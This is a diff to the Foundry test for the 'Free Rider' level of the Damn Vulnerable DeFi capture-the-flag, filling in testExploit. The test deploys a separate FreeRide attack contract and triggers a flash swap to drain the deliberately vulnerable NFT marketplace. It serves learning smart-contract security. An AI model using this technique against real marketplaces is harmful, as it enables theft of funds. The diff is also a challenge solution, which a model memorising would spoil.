@@ -9,6 +9,7 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {FreeRide} from "./FreeRide.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -86,6 +87,7 @@ contract FreeRider is Test {
 
         // Get a reference to the created Uniswap pair
         uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));
+        vm.label(address(uniswapV2Pair),"uniswapV2Pair");
 
         assertEq(uniswapV2Pair.token0(), address(dvt));
         assertEq(uniswapV2Pair.token1(), address(weth));
@@ -94,6 +96,7 @@ contract FreeRider is Test {
         freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
             value: MARKETPLACE_INITIAL_ETH_BALANCE
         }(AMOUNT_OF_NFTS);
+        vm.label(address(freeRiderNFTMarketplace),"freeRiderNFTMarketplace");
 
         damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());
 
@@ -131,15 +134,16 @@ contract FreeRider is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
         vm.startPrank(attacker, attacker);
-
+        FreeRide ride = new FreeRide(
+            address(freeRiderBuyer),
+            payable(weth),
+            payable(freeRiderNFTMarketplace),
+            address(damnValuableNFT),
+            address(uniswapV2Pair)
+        );
+        ride.flashSwap();
         vm.stopPrank();
-        /**
-         * EXPLOIT END *
-         */
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
